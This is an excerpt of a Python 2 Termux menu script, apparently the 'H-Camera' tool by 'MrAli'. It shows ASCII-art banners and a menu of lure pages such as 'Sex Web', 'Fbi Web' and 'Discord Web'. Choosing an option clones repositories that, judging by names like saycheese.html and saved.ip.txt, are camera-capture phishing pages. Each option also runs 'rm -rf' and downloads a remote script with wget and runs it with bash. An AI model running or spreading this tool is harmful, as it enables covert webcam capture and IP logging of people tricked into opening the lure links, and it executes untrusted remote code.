...
def sem_2():
 ...
 time.sleep( 0.01)
 print cyan+'''           /Nmmdddhhho++`     ''' +red+'H-Camer'+cyan+'''     /hdhhhhhhdm-               '''
 time.sleep( 0.01)
...
def sem_3():
 ...
 print cyan+'''................................................................```````'''    
 time.sleep(0.01)
 print cyan+'''.........'''+green+'Github : https://github.com/MrAli-s'+cyan+'''...............................''' 
 time.sleep(0.01)
 print cyan+'''........................ MrAli  { '''+red+'H-Camera'+cyan+''' } .............................'''         
 time.sleep(0.01)
 print cyan+'''.....................................................................      '''
 time.sleep(0.01)                              
def sem_4():
 ...
 print red+'''  --`..-..``--.`                   `-+-.-.                   '''
 time.sleep(0.01)
 print red+''' `+/:/:```-.           '''+cyan+'MrAli'+red+'''        `:/..:-`                '''
 time.sleep(0.01)
 print red+'''    `/y- -`           '''+cyan+'MrAliDzz'+red+'''         `/+/.....-            '''
 time.sleep(0.01)
 print red+'''     `++:.                               +o```-::            '''
 time.sleep(0.01)
 print red+'''                                         `+/:/-              '''
...
def sem_5():
 ...
 print cyan+'            `+-             `     `.            `do.'
 time.sleep(0.01)
 print cyan+'              ```       '+green+'MrAli '+cyan+'{'+red+'H-Camera'+cyan+'}         `.`'
 time.sleep(0.01)
 print cyan+'                 ````                      ````'
 time.sleep(0.01)
...
def sem_6():
 ...
 time.sleep(0.01)
 print cyan+"                     (  "+blue+ 'MrAli  '+cyan+ '##### '+red+ ' MrAli '+cyan+" )"
 time.sleep(0.01)
 print cyan+"                  /_~~~~~~~~~~~~~~~~~~~~~~~~~_\ "
 time.sleep(0.01)
 print cyan+"                /~                             ~\ "
 time.sleep(0.01)
 print cyan+'              .~             '+green+'H-Camera '+cyan+'             ~'
 time.sleep(0.01)
 ...
 time.sleep(0.01)
 print cyan+"        \------_____________[MrAli DZZ]__________-------/"
 time.sleep(0.01)
 print cyan+"           |      ||         ~~~~~~~~       ||      |"
 time.sleep(0.01)
 print cyan+"            \_____/                          \_____/"
...
def sem_7():
 ...
 time.sleep(0.01)
 print cyan+"""                     (   3 C    )     /|___ / """+red+"H-Camera"+cyan+""" \ """
 time.sleep(0.01)
...
def sem_8():
 ...
 print cyan +'         !!                                           !! \ '
 time.sleep(0.01)          
 print cyan +'         !!           Welcome to { '+red+'H-Camera'+cyan+' }           !!  \ '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)
 print cyan +'         !!                                           !!  ! '
 ...
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!  programmer :  { '+red+'MrAli DZ'+cyan+' }                !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)        
 print cyan +'         !!  github :  { '+red+'MrAli-s/H-Camera'+cyan+' }         !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  / '
...
rm -rf H-Camera
cd ..
git clone https://github.com/MrAli-s/H-Camera
cd H-Camera
chmod +x *
echo ''
echo ' hello '
...
def moni():
 print ''
 time.sleep(2)
 print cyan + '[*]starting the H-Camera ...'
 time.sleep(3)
 print ''
...
def OpEn():
 sem()
 print '                     '+blue+'H' +green+ '  C' +reset+ '  a' +purple+ '  m' +cyan+ '  e' +yellow+ '  r' +green +' a'
 time.sleep( 0.05)
 time.sleep( 0.05)
 kk(h)
 print green + "  +________________________________________+"
 time.sleep(0.05)
 print cyan + "  +_[1]Sex Web__" + reset + "_[2]YouTube Web__          |" 
 time.sleep(0.05)
 print "   _                              \__      |"
 print "    _                                \     |"
 time.sleep(0.05)
 print purple + "     |_[3]Fbi Web__" + green + "_[4]Senfcall Web___|____|" 
 time.sleep(0.05)
 print "     |                                     |"
 time.sleep(0.05)
 print blue + "      \_[5]girl-call Web__" + red + "_[6]Discord Web__+"
...
#  os.system('ifconfig wlan0 | grep -o 192..........')
 ...
 print''
 time.sleep(0.05)
 enter =raw_input( cyan + " {Enter Number} H-Camera > ")
 if enter == "1" or enter == "Sex Web" or enter == "01":
  os.system('clear')
  print '\n####Install Sex Web'
...
#  os.system('git clone https://github.com/MrAli-s/01010cam.git')
  ...
  os.system('clear')
  print '\n####Install senfcall Web'
# os.system('apt update && apt upgrade -y')
  os.system('apt install wget -y')
#  os.system('git clone https://github.com/MrAli-s/01010cam.git')
  os.system('rm -rf  extract.sh  Hack.sh Web.html saved.ip.txt getid Custom.html LICENSE README.md captured copy.sh extract.sh  saycheese.html index.php fix-ar-ngrok  index2.html ip.php post.php ngrok template.php index.html jmaxopcam.sh 01010cam')
  os.system('git clone https://github.com/MrAli-s/senfcall-cam.git')
  os.system('wget https://raw.githubusercontent.com/Cesar-Hack-Gray/release-download/master/fix-ar-ngrok && bash fix-ar-ngrok')
...
#  os.system('git clone https://github.com/MrAli-s/01010cam.git')
  os.system('rm -rf  extract.sh  Hack.sh Web.html saved.ip.txt getid Custom.html LICENSE README.md captured copy.sh extract.sh  saycheese.html index.php fix-ar-ngrok  index2.html ip.php post.php ngrok template.php index.html jmaxopcam.sh 01010cam')
  os.system('git clone https://github.com/MrALi-s/Discord-cam.git')
  os.system('wget https://raw.githubusercontent.com/Cesar-Hack-Gray/release-download/master/fix-ar-ngrok && bash fix-ar-ngrok')
  ...
  time.sleep(6)
  webbrowser.open_new('https://www.instagram.com/i._dont_._care')
  os.system('termux-open https://www.instagram.com/i._dont_._care')
  OpEn()
 else:
  error()
  OpEn()
